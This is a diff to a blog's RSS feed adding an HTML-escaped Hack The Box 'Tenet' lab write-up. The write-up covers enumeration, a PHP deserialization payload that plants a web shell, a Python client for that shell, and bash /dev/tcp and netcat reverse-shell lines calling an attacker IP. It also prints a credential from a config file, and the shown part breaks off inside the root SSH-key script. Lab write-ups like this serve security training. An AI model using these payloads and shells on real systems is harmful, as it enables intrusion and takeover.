@@ -11,6 +11,428 @@
     
     
     <item>
+      <title>HTB Tenet</title>
+      <link>http://nightwolf56.github.io/htb-writeups/tenet-writeup/</link>
+      <pubDate>Tue, 22 Jun 2021 00:00:00 +0000</pubDate>
+      
+      <guid>http://nightwolf56.github.io/htb-writeups/tenet-writeup/</guid>
+      <description>&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/tenet-logo.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Tenet starts off with a wordpress site. After some enumeration second domain is found and a PHP file vulnerable to object injection. From there, an attacker can get a shell, find credentials in a configuration file, and privesc to root by leveraging a race condition.&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;NMAP shows port 22 is open for SSH and port 80 is running an HTTP server displaying the default apache2 page.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-01-17 00:47 UTC
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.223
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 14.61 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The default page doesn&amp;rsquo;t give us a whole lot of info and there doesn&amp;rsquo;t seem to be a robots.txt. FFUF or another directory brute forcer  can be used to learn there is a wordpress directory.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ffuf -u http://10.10.10.223/FUZZ -w /opt/dirbuster-wordlists/directory-list-2.3-medium.txt
+
+        /&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;___\  /&amp;#39;&lt;/span&gt;___&lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;          /&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;___&lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;       /&lt;span style=&#34;color:#ae81ff&#34;&gt;\ \_&lt;/span&gt;_/ /&lt;span style=&#34;color:#ae81ff&#34;&gt;\ \_&lt;/span&gt;_/  __  __  /&lt;span style=&#34;color:#ae81ff&#34;&gt;\ \_&lt;/span&gt;_/
+       &lt;span style=&#34;color:#ae81ff&#34;&gt;\ \ &lt;/span&gt;,__&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;,__&lt;span style=&#34;color:#ae81ff&#34;&gt;\/\ \/\ \ \ \ &lt;/span&gt;,__&lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;\ \ \_&lt;/span&gt;/ &lt;span style=&#34;color:#ae81ff&#34;&gt;\ \ \_&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;\ \ \_\ \ \ \ \_&lt;/span&gt;/
+         &lt;span style=&#34;color:#ae81ff&#34;&gt;\ \_\ &lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;\ \_\ &lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\ \_&lt;/span&gt;___/  &lt;span style=&#34;color:#ae81ff&#34;&gt;\ \_\
+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;          &lt;span style=&#34;color:#ae81ff&#34;&gt;\/&lt;/span&gt;_/    &lt;span style=&#34;color:#ae81ff&#34;&gt;\/&lt;/span&gt;_/   &lt;span style=&#34;color:#ae81ff&#34;&gt;\/&lt;/span&gt;___/    &lt;span style=&#34;color:#ae81ff&#34;&gt;\/&lt;/span&gt;_/
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.223/FUZZ
+ :: Wordlist         : FUZZ: /opt/dirbuster-wordlists/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
+ :: Threads          : &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+                        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 10918, Words: 3499, Lines: 376&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;                       &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 1688, Words: 186, Lines: 43&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+wordpress               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 316, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+                        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 10918, Words: 3499, Lines: 376&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+server-status           &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 403, Size: 277, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+:: Progress: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;220547/220547&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; :: Job &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1/1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; :: &lt;span style=&#34;color:#ae81ff&#34;&gt;276&lt;/span&gt; req/sec :: Duration: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0:13:17&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; :: Errors: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ::
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Adding &lt;code&gt;tenet.htb&lt;/code&gt; to  &lt;code&gt;/etc/hosts&lt;/code&gt; will make it function better. Wordpress tends to want to redirect to a domain. There are a few articles talking about their newly coming services and mention of a site migration. On one post, there is a comment that references a &amp;ldquo;sator.php&amp;rdquo; file and a backup version of it. Seemingly, the site migration is incomplete.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/tenet-migrationcomment.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Sator dosent&#39; exist on this site this site. However,  box might have multiple virtual hosts. That turns out to be the case. After &lt;code&gt;sator.tenet.htb&lt;/code&gt; is added &lt;code&gt;/etc/hosts&lt;/code&gt; a copy of the wordpress site seen found prior is accessible  On this one, &lt;code&gt;sator.php&lt;/code&gt; is present and more importantly, the aforementioned backup version of it, &lt;code&gt;sator.php.bak&lt;/code&gt; is also accessible.&lt;/p&gt;
+&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/tenet-statorphpbak.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sator.php&lt;/code&gt; takes input through the &lt;code&gt;arepo&lt;/code&gt; parameter. That output is then deserialized. There is also a class that is called DatabaseExport that writes to a file Deseralizaiton can lead to some unintended results through object injection.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;__destruct ()&lt;/code&gt; function means PHP file can be leveraged to create object and from it a file. To  pull this off, write a PHP file that mirrors sator.php but a bit different.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DatabaseExport&lt;/span&gt;
+{
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $user_file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;users.txt&amp;#39;&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;update_db&lt;/span&gt;()
+    {
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[+] Grabbing users from text file &amp;lt;br&amp;gt;&amp;#39;&lt;/span&gt;;
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Sucess&amp;#39;&lt;/span&gt;;
+    }
+
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct()
+    {
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;user_file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;magic.php&amp;#39;&lt;/span&gt;;
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;?php system(&amp;#34;whoami&amp;#34;); ?&amp;gt;&amp;#39;&lt;/span&gt;;
+
+    }
+}
+
+$app &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DatabaseExport&lt;/span&gt;();
+&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;($app);
+&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Instead of a &lt;code&gt;__destruct&lt;/code&gt; a is used &lt;code&gt;__construct&lt;/code&gt; and a few other items are changed as well. The output file is going to be called &lt;code&gt;magic.php&lt;/code&gt; and the contents will be some simple PHP code to execute the &lt;code&gt;whomami&lt;/code&gt; command.&lt;/p&gt;
+&lt;p&gt;Running the above file using &lt;code&gt;php file&lt;/code&gt; and outputs the following.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;O&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DatabaseExport&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:{&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user_file&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;magic.php&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;?php system(&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;whoami&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;); ?&amp;gt;&amp;#34;&lt;/span&gt;;}&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This can be sent to the server using the &lt;code&gt;arepo&lt;/code&gt; argument. Then a request can be made to &lt;code&gt;10.10.10.223/magic.php&lt;/code&gt;. The response is &lt;code&gt;www-data&lt;/code&gt;, showing code execution.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;If you are interested in learning more about PHP deserialization attacks, IppSec has some awesome videos I referenced while working on this. &lt;a href=&#34;https://youtu.be/JpzREo7XLOY?t=4174&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Player 2 PHP deserialization to place an SSH key.&lt;/a&gt;
+ and &lt;a href=&#34;https://www.youtube.com/watch?v=HaW15aMzBUM&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Intro to PHP deserialization&lt;/a&gt;
+&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;This is a bit clumsy though and there are some ways it can be nicened up.&lt;/p&gt;
+&lt;p&gt;First  &lt;code&gt;whoami&lt;/code&gt; can be changed to instead take the  argument &lt;code&gt;c&lt;/code&gt; from a get request and execute using the system function.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shell_exec&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;]); &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;That can be created on the Tenet with following.
+&lt;code&gt;http://sator.tenet.htb/sator.php?arepo=O:14:&amp;quot;DatabaseExport&amp;quot;:2:{s:9:&amp;quot;user_file&amp;quot;;s:9:&amp;quot;magic.php&amp;quot;;s:4:&amp;quot;data&amp;quot;;s:37:&amp;quot;&amp;lt;?php echo shell_exec($_GET[&amp;quot;c&amp;quot;]); ?&amp;gt;&amp;quot;;}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This is very workable and requests can be  sent  with curl, burp, postman, or even just a web browser. But console applications are cool.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; readline
+
+URI &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Path to PHP shell. (http://example.site/file.php)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Sending commands to: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; URI)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
+	command &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;#34;&lt;/span&gt;)
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; command &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exit&amp;#39;&lt;/span&gt;:
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+		r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(URI&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;?c=&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; command)
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It&amp;rsquo;s fairly simple in nature but it does give a way to send and receive commands a terminal like interface. Now that that is ready to go, it&amp;rsquo;s time to get a proper reverse shell.&lt;/p&gt;
+&lt;p&gt;The old fallback of &lt;code&gt;basn -c &#39;bash -i &amp;gt;&amp;amp;/dev/tcp/&amp;lt;ip&amp;gt;/&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1&#39;&lt;/code&gt; fails along with a similar one using netcat &lt;code&gt;nc -e /bin/sh &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt;&lt;/code&gt;. There is more than one way to send this payload though.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+basn -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bash -i &amp;gt;&amp;amp;/dev/tcp/10.10.14.36/5678 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This file is created and saved, a python HTTP server is started in the same directory, and a netcat listener on port 5678. Then we go back to back to our &amp;ldquo;terminal&amp;rdquo; access for Tenet, wget the file, mark it as executable and run it. Right away the netcat listener get&amp;rsquo;s a connection.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/tenet-properreverseshellsteps.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;user&#34;&gt;User&lt;/h2&gt;
+&lt;p&gt;The CWD is wordpress home directory. Listing the files shows the &lt;code&gt;wp-config.php&lt;/code&gt;  file. Inside are credentials configured for interacting with the MySQL database. &lt;code&gt;neil:Opera2112&lt;/code&gt;. Neil used the same password for their login allowing SSH access directory to the box.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/tenet-wp-configphp.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;root&#34;&gt;Root&lt;/h2&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/tenet-neilsudopermissions.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Via &lt;code&gt;sudo -l&lt;/code&gt; Niel&amp;rsquo;s sudo permissions can be checked. It turns it out they can run a script called&lt;code&gt;EnableSSH.sh&lt;/code&gt; with root permissions.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
+&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash&lt;/span&gt;
+
+checkAdded&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+
+        sshName&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;/bin/echo $key | /usr/bin/cut -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; -f 3&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
+
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; ! -z &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;/bin/grep $sshName /root/.ssh/authorized_keys&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+
+                /bin/echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Successfully added &lt;/span&gt;$sshName&lt;span style=&#34;color:#e6db74&#34;&gt; to authorized_keys file!&amp;#34;&lt;/span&gt;
+
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+
+                /bin/echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Error in adding &lt;/span&gt;$sshName&lt;span style=&#34;color:#e6db74&#34;&gt; to authorized_keys file!&amp;#34;&lt;/span&gt;
+
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
+checkFile&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; ! -s $1 &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; ! -f $1 &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+
+                /bin/echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Error in creating key file!&amp;#34;&lt;/span&gt;
+
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; -f $1 &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt; /bin/rm $1; &lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+
+                exit &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
+addKey&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+
+        tmpName&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;mktemp -u /tmp/ssh-XXXXXXXX&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
+
+        &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;umask 110; touch $tmpName&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+
+        /bin/echo $key &amp;gt;&amp;gt;$tmpName
+
+        checkFile $tmpName
+
+        /bin/cat $tmpName &amp;gt;&amp;gt;/root/.ssh/authorized_keys
+
+        /bin/rm $tmpName
+
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
